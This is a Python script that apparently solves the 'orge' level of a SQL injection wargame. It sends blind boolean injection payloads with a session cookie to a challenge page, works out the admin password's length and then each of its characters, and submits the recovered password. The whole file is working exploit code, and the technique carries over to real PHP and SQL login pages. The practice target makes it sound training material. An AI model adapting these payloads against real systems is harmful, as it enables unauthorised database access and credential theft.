import string
import requests


def find_password_length(n):
    payload = f"?pw='||id='admin' %26%26 LENGTH(pw)={n}-- "
    if 'Hello admin' in send_request(payload):
        return n


def find_password(position, char):
    payload = f"?pw='||id='admin' %26%26 SUBSTRING(pw,{position},1)='{char}'-- "
    if 'Hello admin' in send_request(payload):
        return char


def send_request(payload):
    url = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'
    cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
    r = requests.get(url + payload, cookies=cookie)
    return r.text


if __name__ == "__main__":
    pw = []
    characters = string.printable

    for i in range(100):
        if find_password_length(i):
            length = i
            print(f'pw length is {length}')
            break

    for i in range(1, length + 1):
        for char in characters:
            if find_password(i, char):
                pw.append(char.lower())
                print(f'pw = {pw}')
                break

    print(f'pw={"".join(pw)}')

    if 'ORGE Clear!' in send_request(f'?pw={"".join(pw)}'):
        print('ORGE Clear!')
    else:
        print('Something went wrong!!!')
